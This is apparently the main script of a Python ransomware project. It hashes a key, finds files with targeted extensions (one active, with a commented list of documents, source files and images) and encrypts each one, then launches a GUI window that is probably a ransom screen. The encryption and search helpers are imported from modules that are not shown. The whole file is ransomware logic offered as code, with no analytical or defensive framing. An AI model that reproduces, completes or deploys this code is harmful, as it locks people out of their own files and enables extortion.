import hashlib,Search
from RansomModule import *
from Get_data import *
from main_window import *

password = bytes(get_key(),encoding="utf-8")
key = hashlib.sha256(password).digest()
default_path = os.path.dirname(os.path.realpath(__file__))
#default_path = "C:\\Users\\oonja\\Desktop\\Ransomware"

ext_list = [".hwp"]
''''
ext_list = [".doc", ".hwp",".c",".cpp",
".java",".ppt", ".pptx", ".pptm", ".jpg", 
".png", ".jpeg", ".gif", ".bmp", ".txt"]
'''
file,directory = Search.search(default_path,ext_list)

for i in file:
    encrypt_file(key,i)

print("Encrypted Finish!")

app = QApplication(sys.argv)
myWindow = MyWindow()
myWindow.show()
app.exec_()
